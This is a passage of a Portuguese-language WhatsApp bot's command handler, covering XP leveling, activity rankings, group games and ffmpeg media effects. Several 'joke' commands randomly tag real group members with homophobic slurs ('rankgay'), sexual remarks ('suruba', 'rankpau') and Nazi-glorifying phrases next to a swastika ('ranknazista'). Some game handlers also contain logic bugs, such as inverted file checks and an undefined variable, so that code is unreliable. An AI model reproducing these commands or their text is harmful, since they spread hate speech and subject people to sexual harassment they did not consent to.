enviar(`${args[0]} experiência${Number(args[0]) > 1 ? `s` : ``} fo${Number(args[0]) > 1 ? `ram` : `i`} adicionada${Number(args[0]) > 1 ? `s` : ``} a este usuário...`)
break

case 'tirarxp':
if(!SoDono) return enviar(arise.donosmt)
if(isCmdPremium && !isPremium) return enviar(arise.premium)
if(!q) return enviar("Digite a quantidade de XP que deseja retirar")
if(!Number(args[0])) return enviar(args[0] + " não é número...")
if(Number(args[0]) < 1) return enviar("Tem que tirar ao menos 1 de XP")
if(q.includes(".")) return enviar("Não pode número decimal")
AB = level2.map(i => i.id).indexOf(menc_prt ? menc_prt : sender)
level2[AB].contador -= Number(args[0])
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
enviar(`${args[0]} experiência${Number(args[0]) > 1 ? `s` : ``} fo${Number(args[0]) > 1 ? `ram` : `i`} retirada${Number(args[0]) > 1 ? `s` : ``} deste usuário...`)
break

case 'blocklevel':
if(!SoDono) return enviar(arise.donosmt)
if(!menc_os2) return enviar("Marque o @ ou a mensagem da pessoa que deseja bloquear do contador.")
if(!JSON.stringify(level2).includes(menc_os2)) return enviar("O usuário mencionado não está presente no contador de mensagens.")
AB = level2.map(i => i.id).indexOf(menc_os2)
if(level2[AB].block == true) return enviar("O usuário mencionado já está bloqueado no contador.")
level2[AB].block = true
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
enviar("Usuário bloqueado do contador com sucesso... As interações do mesmo não serão mais contabilizadas!")
break

case 'unblocklevel':
if(!SoDono) return enviar(arise.donosmt)
if(!menc_os2) return enviar("Marque o @ ou a mensagem da pessoa que deseja bloquear do contador.")
if(!JSON.stringify(level2).includes(menc_os2)) return enviar("O usuário mencionado não está presente no contador de mensagens.")
AB = level2.map(i => i.id).indexOf(menc_os2)
if(level2[AB].block == false) return enviar("O usuário mencionado não está bloqueado atualmente!")
level2[AB].block = false
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
enviar("Usuário desbloqueado do contador com sucesso! As interações do usuário mencionado voltarão a ser contabilizadas.")
break

case 'blocklevel-list': case 'blocklevellist':
if(!SoDono) return enviar(arise.donosmt)
txt = `[Total: *${level2.length}*] - Lista de usuários bloqueados do contador de XP:\n`
let blocklevellist = 0
for(i = 0; i < level2.length; i++) {
  if(level2[i].block == true) {
txt += `*${i+1}.* @${level2[i].id.split('@')[0]}\n`
blocklevellist += 1
}
}
txt += `\n–\n• Total de Bloqueados: *${blocklevellist}*`
if(blocklevellist > 0) {
mention(txt)
} else {
enviar("Não existe nenhum *usuário bloqueado* do contador XP.")
}
break

case 'rmlevel':
if(!SoDono) return enviar(arise.donosmt)
if(!q && !menc_os2) return enviar("Marque a pessoa que deseja apagar do contador.")
var qp = menc_os2 ? menc_os2 : q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
if(!JSON.stringify(level2).includes(qp)) return enviar("O usuário mencionado não está registrado no contador.")
AB = level2.map(i => i.id).indexOf(qp)
level2.splice(AB, 1)
fs.writeFileSync("./banco de dados/usuarios/leveling.json", JSON.stringify(level2))
enviar("Usuário apagado foi contador com sucesso como o(a) senhor(a) pediu...")
break

case 'rankativo': 
case 'rankativos':   
if(!isGroup) return enviar(arise.grupo)
var i3 = countMessage.map(i => i.groupId).indexOf(from)
var blue = countMessage[i3].numbers.map(i => i)
blue.sort((a, b) => ((a.figus == null ? a.figus = 0 : a.figus + a.messages + a.cmd_messages) < (b.figus == null ? b.figus = 0 : b.figus + b.cmd_messages + b.messages)) ? 0 : -1)
menc = [] 
blad = `*🪖 Rank dos mais ativos no grupo:*\n`
for ( i = 0; i < (blue.length < 5 ? blue.length : 5); i++) {
if (i != null) blad += `\n*🏅 ${i + 1}º Lugar:* @${blue[i].id.split('@')[0]}\n• Quantidade de mensagens: *${blue[i].messages}*\n• Quantidade de comandos: *${blue[i].cmd_messages}*\n• Figurinhas encaminhadas: *${blue[i].figus}*\n`
menc.push(blue[i].id)
}
enviar(blad)
break

case 'rankinativo':
case 'rankinativos':
if(!isGroup) return enviar(arise.grupo)
if(!isGroupAdmins) return enviar(arise.adm)
bule = [];
bule2 = []
mentioned_jid = []
for(cag of countMessage[ind].numbers){
bule2.push(cag.id)
if(cag.messages <= 1){bule.push(cag)}}
bule.sort((a, b) => ((a.messages + a.cmd_messages) < (b.cmd_messages + b.messages)) ? 0 : -1)
boardi = `🪖 *Rank dos mais inativos do grupo:*\n-\n`
if(bule.length == 0)boardi += '❌ Nenhum usuário inativo foi encontrado neste grupo.️'
for ( i = 0; i < (bule.length < 5 ? bule.length : 5); i++) {
if (i != null) boardi += `*🏅 ${i + 1}º Lugar:* @${bule[i].id.split('@')[0]}\n• mensagens enviadas pelo usuário(a): *${bule[i].messages}*\n• comandos executados pelo usuário(a): *${bule[i].cmd_messages}*\n• Figurinhas envuadas pelo usuário(a): *${blue[i].figus}*\n\n`
mentioned_jid.push(bule[i].id)
} 
mentions(boardi, mentioned_jid, true)
break

case 'checkativo':
if(!isGroup) return enviar(arise.grupo)
if(groupIdscount.indexOf(from) < 0) return enviar('Eu ainda não tenho dados sobre o grupo')
var ind = groupIdscount.indexOf(from)
if(!menc_os2 || menc_jid2[1]) return enviar('Marque o @ de quem deseja puxar a atividade / Só pode um por vez..')
if(numbersIds.indexOf(menc_os2) >= 0) {
var indnum = numbersIds.indexOf(menc_os2)
var RSM_CN = countMessage[ind].numbers[indnum]
mentions(`Consulta do usuário @${menc_os2.split('@')[0]}\n–\n• Quantidade de mensagens enviadas: *${RSM_CN.messages}*\n• Quantidade de comandos executados: *${RSM_CN.cmd_messages}*\n• Usuário conectado em dispositivo: *${RSM_CN.aparelho}*\n• Figurinhas encaminhadas: *${RSM_CN.figus}*\n–\n〘 *${groupName}* 〙`, [menc_os2], true)
} else {
mentions(`Não tenho nenhuma informação no grupo sobre o *@${menc_os2.split('@')[0]}*.`, [menc_os2], true)
}
break

case 'rankgay': case 'rankgays':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
ABC = `🏳️‍🌈 *RANK DOS 5 MAIS GAYS DO GRUPO!*\n—\n`
TMGAYS = ["Esse aí gosta de cheirar banana até umas horas kakak", "Gosta de ser dominado e chicoteado.", "Viadinho gente boa, nada contra os veados.","Esse aí roda mais que roda de caminhão.", "Mapoa é você meu amor?", "Esse aí ainda tá no armário, a franga tá presa!", "Profissional na garganta profunda!", "Essa bicha é finíssima!", "Essa aí precisa sair do closet ainda!", "Vixi esse aí e vitaminado!", "Vixi um gay vulgo irene!", "Poc fechosa, amo tu mona!"]
for (var i = 0; i < 5; i++) {
ABC += `• ${i+1}° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMGAYS[Math.floor(Math.random() * TMGAYS.length)]} )\n`
}
mencionarIMG(ABC, rnkgay)
break;

case 'rankgado': case 'rankgados':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
ABC = `RANK DOS 5 MAIS GADO DO GRUPO 🐂🐃\n\n`
for (var i = 0; i < 5; i++) {
ABC += `${Math.floor(Math.random() * 100)}% @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n\n`
}
mencionarIMG(ABC, rnkgado);
break;

case 'rankcorno': case 'rankcornos':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
ABC = `🐂 *RANK DOS 5 MAIS CORNOS DO GRUPO!*\n—\n`
TMCRN = ["Familiar, leva até chifre com os parentes!", "Masoquista, leva chifre mas não larga a mulher!", "Atéu, leva chifre e não acredita!", "Político, só faz promessa e não cumpre o que fala!", "Esse é que leva chifres, vai embora e volta por causa das crianças.", "Xuxa, o que não larga a mulher por causa dos baixinhos.", "Famoso, aquele que por onde passa é reconhecido como tal.", "Inflação, a cada dia que passa o chifre aumenta."]
for (var i = 0; i < 5; i++) {
ABC += `• ${i+1}° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMCRN[Math.floor(Math.random() * TMCRN.length)]} )\n`
}
mencionarIMG(ABC, rnkcorno);
break;

case 'surubao': case 'suruba':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
if (!q) return enviar(`Eita, coloque o número de pessoas após o comando.`)
if (Number(q) > 5) return enviar("Coloque um número menor, ou seja, abaixo de *5*.")
emojiskk = ["🥵", "😈", "🫣", "😏"]
emojis = emojiskk[Math.floor(Math.random() * emojiskk.length)]  
frasekk = [`tá querendo relações sexuais a ${q}, topa?`, `quer que *${q}* pessoas venham de *chicote, algema e corda de alpinista*.`, `quer que ${q} pessoas der tapa na cara, lhe chame de cachorra e fud3r bem gostosinho...`]
context = frasekk[Math.floor(Math.random() * frasekk.length)]  
ABC = `${emojis} @${sender.split('@')[0]} ${context}\n\n`
for (var i = 0; i < q; i++) {
ABC += `@${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
mention(ABC);
break;

case 'rankgostosos': case 'rankgostoso':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
ABC = `*RANK DOS 5 MAIS GOSTOSOS DO GRUPO* 😏🔥\n—\n`
TMGSTS = ["Você tá olhando para um semi Deus!", "Mds, me apaixonei! Passa o insta gatinho?", "Ei ei gatinhas, o gostosão do grupo chegou!", "Gostoso? É, pena que é homem galinha!", "Não sei se comparo esse gostoso com o Ares Ridalgo!", "Cruz credo, porque tu tá aqui? Tu é feio desgraça!"]
for (var i = 0; i < 5; i++) {
ABC += `• ${i+1}° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMGSTS[Math.floor(Math.random() * TMGSTS.length)]} )\n`
}
mencionarIMG(ABC, rnkgostoso);
break;

case 'ranknazista': case 'ranknazistas':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
ABC = `*💂‍♂RANK DOS 5 MAIS NAZISTAS DO GRUPO 卐🤡*\n—\n`
TMNZTS = ["Soldado nazista, marcha com estilo.‍", "Comandante implacável, lidera com rigor.️", "Nazista estrategista, conquista territórios.️", "Mestre da ordem, disciplina em primeiro lugar.", "Soldado de elite, Nazista hardcore.", "General invencível, domina as batalhas.", "Nazista disciplinado, fiel à causa.", "Líder autoritário, impõe respeito.️", "Soldado feroz, nazismo no coração.", "Mestre da propaganda, convence com palavras.️", "Nazista moderno, tecnologia na guerra.", "Máquina de guerra, implacável e eficiente.️","Comandante supremo, nazismo eterno.", "Soldado leal, marcha em nome da ideologia.", "Nazista clássico, revive o passado.", "General poderoso, Nazista do século XXI.", "Comandante inabalável, Nazista de honra.", "Soldado devoto, nazismo no sangue.", "Mestre da retórica nazista, convence a todos.", "Nazista visionário, futuro sob a suástica."];
for (var i = 0; i < 5; i++) {
ABC += `• ${i+1}° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMNZTS[Math.floor(Math.random() * TMNZTS.length)]} )\n`
}
mencionarIMG(ABC, rnknazista);
break;

case 'rankotaku': case 'rankotakus':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
ABC = `*㊙ RANK DOS 5 MAIS OTAKU DO GRUPO ( ˶•̀ _•́ ˶)*\n—\n`
for (var i = 0; i < 5; i++) {
ABC += `• ${i+1}° *[${Math.floor(Math.random() * 100)}%]* - @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]}\n`
}
mencionarIMG(ABC, rnkotaku);
break;

case 'rankpau':
if(!isGroup) return enviar(arise.grupo)
if(!isModobn) return enviar(arise.brincadeira)   
ABC = `*RANK DOS 5 PAU MAIOR DO GRUPO 📏*\n—\n`
TMPAU = ["Pequeno pra cact, se mata maluco", `Pequenininho chega ser até fofo`, `Menor que meu dedo mindinho pequeno demais`, `Até que dá sentir, tá na média`, `Até que é grandinho`, `Grande até!`, `Gigantesco igual meu braço`, `Enorme quase chega no útero`, `Grandão demais em, e uii`, `Vara de pegar manga, grande demais, como sai na rua assim??`, "Que grandão em, nasceu metade animal"]
for (var i = 0; i < 5; i++) {
ABC += `• *${i+1}°* @${somembros[Math.floor(Math.random() * somembros.length)].split("@")[0]} -> ( ${TMPAU[Math.floor(Math.random() * TMPAU.length)]} )\n`
}
mencionarIMG(ABC, rnkpau);
break;

case 'mencionar':
if (!q) return enviar(`Você usou o comando de forma incorreta, use a correta: mencionar corno`)
if (!isGroup) return enviar(`Esta brincadeira só funciona em grupos.`)
if(!isModobn) return enviar(arise.brincadeira)   
d = []
teks = `Estou mencionando o *${q}* do grupo: `
for(i = 0; i < 1; i++) {
r = Math.floor(Math.random() * groupMetadata.participants.length + 0)
teks += `@${groupMembers[r].id.split('@')[0]}`
d.push(groupMembers[r].id)
}
await mentions(teks, d, true)
break;

case 'jogodavelha':
if(!isGroup) return enviar(arise.grupo)
if(!menc_jid2) return enviar("Marque junto com o comando, o @ do usuário que deseja desafiar..")
joguinhodavelhajs.push(sender)
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.push(from)
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
if(fs.existsSync(`./exports/tictactoe/db/${from}.json`)) {
const boardnow = setGame(`${from}`);
const matrix = boardnow._matrix;
const chatMove = `『 *🎮 Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸ ️🎮* 』\n—\n💢 Alguém já está jogando!\n-\n• @${boardnow.X} VS @${boardnow.O}\n—\n• Sua vez: @${boardnow.turn == "X" ? boardnow.X : boardnow.O}\n-\n${matrix[0][0]}  ${matrix[0][1]}  ${matrix[0][2]}\n${matrix[1][0]}  ${matrix[1][1]}  ${matrix[1][2]}\n${matrix[2][0]}  ${matrix[2][1]}  ${matrix[2][2]}`;
safeSendMessage(from, {text: chatMove}, {quoted: non,
mentions: [
boardnow.X + "@s.whatsapp.net",
boardnow.O + "@s.whatsapp.net",
]});
return;
}
if(argss.length === 1)
return enviar(`Jogue com alguém, para inicar a partida : ${prefix + command} @membro.`);
const boardnow = setGame(`${from}`);
console.log(colors.red(time, "red"), colors.magenta("[ JOGO DA VELHA ]"), colors.white(`Iniciado - Sessão: ${boardnow.session}`));
boardnow.status = false;
boardnow.X = sender.replace("@s.whatsapp.net", "");
boardnow.O = argss[1].replace("@", "");
var blabord = [`${boardnow.X}`, `${boardnow.O}`]
fs.writeFileSync(`./exports/tictactoe/db/${from}.json`,
JSON.stringify(boardnow, null, 2)
);
const strChat = `『🎮 *ᎬՏᏢᎬᎡᎪΝᎠϴ ϴᏢϴΝᎬΝͲᎬ* 🎮』\n—\n@${sender.replace("@s.whatsapp.net", "")} está te desafiando para uma partida de jogo da velha, onde tem simbolos bola e x. oque marcar 3 dos simbolos em linha reta primeiro vence:\n[ ${argss[1]} ] Use *『S』* para aceitar ou *『N』* caso não queira ir com esse oponente ou só não esteja com vontade.\n—\nSe houver problemas, chame um adm para que use o comando ${prefix}rv e resete o game.`;
b = [sender, menc_jid]
mentions(strChat, b, true)
break

case 'resetarvelha':
case 'resetavelha':  
case 'resetarv':
case 'resetav': 
case 'resetvelha':
case 'rv': 
if(!isJoguin && !isGroupAdmins) return enviar(`Fale com quem iniciou o jogo, só ele pode resetar, ou então algum admin.`)
if(fs.existsSync("./exports/tictactoe/db/" + from + ".json")) {
DLT_FL("./exports/tictactoe/db/" + from + ".json");
enviar(`Jogo da velha resetado com sucesso!`);
joguinhodavelhajs.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha.json', JSON.stringify(joguinhodavelhajs))
joguinhodavelhajs2.splice([])
fs.writeFileSync('./banco de dados/usuarios/joguinhodavelha2.json', JSON.stringify(joguinhodavelhajs2))
} else {
enviar(`Não a nenhuma sessão em andamento..`);
}
break

case "ppt":
if(!q) return enviar(`Você deve digitar ppt pedra, ppt papel ou ppt tesoura`)
ppt = ["pedra", "papel", "tesoura"]
ppy = ppt[Math.floor(Math.random() * ppt.length)]
ppg = Math.floor(Math.random() * 1) + 10
pptb = ppy
if((pptb == "pedra" && args == "papel") ||
(pptb == "papel" && args == "tesoura") ||
(pptb == "tesoura" && args == "pedra")) {
var vit = "vitoria"
} else if((pptb == "pedra" && args == "tesoura") ||
(pptb == "papel" && args == "pedra") ||
(pptb == "tesoura" && args == "papel")) {
var vit = "derrota"
} else if((pptb == "pedra" && args == "pedra") ||
(pptb == "papel" && args == "papel") ||
(pptb == "tesoura" && args == "tesoura")) {
var vit = "empate"
} else if(vit = "undefined") {
return enviar(`Você deve digitar ppt pedra, ppt papel ou ppt tesoura`)
}
if(vit == "vitoria") {
var tes = "Vitória do jogador"
}
if(vit == "derrota") {
var tes = "A vitória é minha"
}
if(vit == "empate") {
var tes = "O jogo terminou em empate"
}
enviar(`${NomeDoBot} jogou: ${pptb}\nO jogador jogou: ${args}\n-\n${tes}`)
break

case 'anagrama':
if (!isGroup) return enviar(arise.grupo) 
if (!isGroupAdmins) return enviar('Somente adms!')
if(!isModobn) return enviar(arise.brincadeira)   
const anaaleatorio = Math.floor(Math.random() * palavrasANA.length)
if(!q) return enviar('Use 1 para ativar o jogo do anagrama, ou seja, para desativar utilize o valor numérico 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./banco de dados/grupos/games/anagrama/${from}.json`)) {
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/anagrama/${from}.json`))
enviar(`${II}O jogo já foi iniciado neste grupo!${II}\n• Anagrama: ${dataAnagrama2.embaralhada}\n• Dica: ${dataAnagrama2.dica}`)} else {
fs.writeFileSync(`./banco de dados/grupos/games/anagrama/${from}.json`, `${JSON.stringify(palavrasANA[anaaleatorio])}`)
safeSendMessage(from, {text: `Decifre a palavra embaralhada abaixo:\n• ${II}Anagrama:${II} ${dataAnagrama2.embaralhada}\n• ${II}Dica:${II} ${dataAnagrama2.dica}`}, {quoted: non})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./banco de dados/grupos/games/anagrama/${from}.json`)) return enviar('Não tem como desativar o jogo do anagrama pôs ele não foi ativado')
fs.unlinkSync(`./banco de dados/grupos/games/anagrama/${from}.json`)
enviar("Desativado com sucesso.")
}
break

case 'gartic':
if (!isGroup) return enviar(arise.grupo) 
if (!isGroupAdmins) return enviar('Somente adms!')
if(!isModobn) return enviar(arise.brincadeira)   
const garticquiz = Math.floor(Math.random() * garticArchives.length)
if(!q) return enviar('Use 1 para ativar o gartic, ou seja, para desativar utilize o valor numérico 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./banco de dados/grupos/games/gartic/${from}.json`)) {
dataGartic2 = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/gartic/${from}.json`))
imagemtexto = `👩🏼‍🏫 - A resposta é representada por um(a): ${dataGartic2.pergunta}
📜 - A resposta supostamente começa com a(s) letra(s): "${dataGartic2.letra_inicial}"
🤔 - Hmmm, contém traços? ${dataGartic2.contem_traços}
–
❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *revelargartic* para revelar a resposta correta da afirmação._`
wew = await getBuffer(`${dataGartic2.imagem}`)  
await safeSendMessage(from, {image: wew, caption: imagemtexto, thumbnail: wew}, {quoted: non})
} else {
fs.writeFileSync(`./banco de dados/grupos/games/gartic/${from}.json`, `${JSON.stringify(garticArchives[garticquiz])}`)
imagemtexto = `👩🏼‍🏫 - A resposta é representada por um(a): ${garticArchives[garticquiz].pergunta}
📜 - A resposta supostamente começa com a(s) letra(s): "${garticArchives[garticquiz].letra_inicial}"
🤔 - Hmmm, contém traços? ${garticArchives[garticquiz].contem_traços}
–
❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *revelargartic* para revelar a resposta correta da afirmação._`
wew = await getBuffer(`${garticArchives[garticquiz].imagem}`)  
await safeSendMessage(from, {image: wew, caption: imagemtexto, thumbnail: wew}, {quoted: non})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./banco de dados/grupos/games/gartic/${from}.json`)) return enviar('Não tem como desativar o gartic pôs ele não foi ativado.')
fs.unlinkSync(`./banco de dados/grupos/games/gartic/${from}.json`)
enviar("Desativado com sucesso.")
}
break

case 'enigma':
if (!isGroup) return enviar(arise.grupo) 
if (!isGroupAdmins) return enviar('Somente adms!')
if(!isModobn) return enviar(arise.brincadeira)   
const engimaSolu = Math.floor(Math.random() * enigmaArchive.length)
if(!q) return enviar('Use 1 para ativar o enigma, ou seja, para desativar utilize o valor numérico 0')
if (args.join(' ') === '1') {
if(fs.existsSync(`./banco de dados/grupos/games/enigma/${from}.json`)) {
SAB_SAB_ENI = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/enigma/${from}.json`))
imagemtexto = `📜 - Resolva o seguinte enigma abaixo:

${SAB_SAB_ENI.charada}

❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *revelarenigma* para revelar a resposta correta da enigma._`
wew = await getBuffer(`https://telegra.ph/file/15be608763684b3e3af38.jpg`)  
await safeSendMessage(from, {image: wew, caption: imagemtexto, thumbnail: wew}, {quoted: non})
} else {
fs.writeFileSync(`./banco de dados/grupos/games/enigma/${from}.json`, `${JSON.stringify(enigmaArchive[engimaSolu])}`)
imagemtexto = `📜 - Resolva o seguinte enigma abaixo:

${enigmaArchive[engimaSolu].charada}

❓️ - *Não sabe a resposta?* _Peça ao adm do grupo para usar o comando *revelarenigma* para revelar a resposta correta da enigma._`
wew = await getBuffer(`https://telegra.ph/file/15be608763684b3e3af38.jpg`)  
await safeSendMessage(from, {image: wew, caption: imagemtexto, thumbnail: wew}, {quoted: non})
}
} else if (args.join(' ') ==='0') {
if(!fs.existsSync(`./banco de dados/grupos/games/enigma/${from}.json`)) return enviar('Não tem como desativar o enigma pôs ele não foi ativado.')
fs.unlinkSync(`./banco de dados/grupos/games/enigma/${from}.json`)
enviar("Desativado com sucesso.")
}
break

case 'revelargartic':  
if (!isGroupAdmins) return enviar('Somente adms podem ver a(s) resposta(s) do jogos!')
if(fs.existsSync(`./banco de dados/grupos/games/gartic/${from}.json`)) return ("Não existe nenhuma partida atual do jogo neste grupo.")
let dataAnagramaa = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/gartic/${from}.json`))
enviar(`• Olá *${pushname}*, a resposta correta da afirmação era: ${II}${dataAnagramaa.resposta}${II}\n• Envie a resposta apresentada acima para passar a próxima..`)
break

case 'revelarenigma':
if (!isGroupAdmins) return enviar('Somente adms podem ver a(s) resposta(s) do jogos!')
if(fs.existsSync(`./banco de dados/grupos/games/enigma/${from}.json`)) return ("Não existe nenhuma partida atual do jogo neste grupo.")
let eni1 = JSON.parse(fs.readFileSync(`./banco de dados/grupos/games/enigma/${from}.json`))
enviar(`• Olá *${pushname}*, a resposta correta do enigma era: ${II}${eni1.respostaEne}${II}\n• Envie a resposta apresentada acima para passar a próxima..`)
break

//=====(ALTERADOR-DE-AUDIO/VIDEO)=======\\

case 'videocontrario':
case 'reversevid':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && info.message.videoMessage || !isQuotedImage) && !q.length <= 1) { 
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -vf reverse -af areverse ${ran}`, (err) => {
DLT_FL(media)
if(err) return enviar(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
safeSendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque um vídeo.")
}
break 

case 'videolento':
case 'slowvid':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && info.message.videoMessage || !isQuotedImage) && !q.length <= 1) { 
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=2*PTS[v];[0:a]atempo=0.5[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
DLT_FL(media)
if(err) return enviar(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
safeSendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: non })
DLT_FL(ran)
})
} else {
enviar("Marque um vídeo.")
}
break

case 'videorapido':
case 'fastvid':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && info.message.videoMessage || !isQuotedImage) && !q.length <= 1) {
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter_complex "[0:v]setpts=0.5*PTS[v];[0:a]atempo=2[a]" -map "[v]" -map "[a]" ${ran}`, (err) => {
DLT_FL(media)
if(err) return enviar(`Err: ${err}`)
buffer453 = fs.readFileSync(ran)
safeSendMessage(from, {video: buffer453, mimetype: 'video/mp4'}, {quoted: non })
DLT_FL(ran)
})	
} else {
enviar("Marque o vídeo.")
}
break

case 'grave2':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=1.6,asetrate=22100" ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break

case 'grave':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a "atempo=0.9,asetrate=44100" ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break

case 'adolesc':
case 'vozmenino':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage && !info.message.videoMessage || isQuotedAudio)) {
muk = isQuotedAudio ? info.message.extendedTextMessage.contextInfo.quotedMessage.audioMessage : info.message.audioMessage
rane = getRandom('.'+await getExtension(muk.mimetype))
buffimg = await getFileBuffer(muk, 'audio')
fs.writeFileSync(rane, buffimg)
gem = rane
ran = getRandom('.mp3')
exec(`ffmpeg -i ${gem} -filter:a atempo=1.06,asetrate=44100*1.25 ${ran}`, (err, stderr, stdout) => {
DLT_FL(gem)
if(err) return enviar('Ocorreu um erro ao adicionar o *efeito sonoro* no áudio.')
hah = fs.readFileSync(ran)
safeSendMessage(from, {audio: hah, mimetype: 'audio/mpeg', ptt:true}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o áudio.")
}
break  

case 'tomp3':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
if((isMedia && !info.message.imageMessage || isQuotedVideo)) {
post = isQuotedImage ? JSON.parse(JSON.stringify(info).replace('quotedM','m')).message.extendedTextMessage.contextInfo.message.imageMessage : info.message.videoMessage
encmedia = isQuotedVideo ? info.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage : info.message.videoMessage
rane = getRandom('.'+await getExtension(encmedia.mimetype))
buffimg = await getFileBuffer(encmedia, 'video')
fs.writeFileSync(rane, buffimg)
media = rane 
ran = getRandom('.mp4')
exec(`ffmpeg -i ${media} ${ran}`, (err) => { 
DLT_FL(media)
if(err) return enviar('Ocorreu uma falha ao fazer a conversão do vídeo para mp3.')
buffer = fs.readFileSync(ran)
safeSendMessage(from, {audio: buffer, mimetype: 'audio/mpeg'}, {quoted: non})
DLT_FL(ran)
})
} else {
enviar("Marque o vídeo para transformar em áudio por favor.")
}
break

case 'bass3':
if(isCmdPremium && !isPremium) return enviar(arise.premium)
reagir(from, '✅')
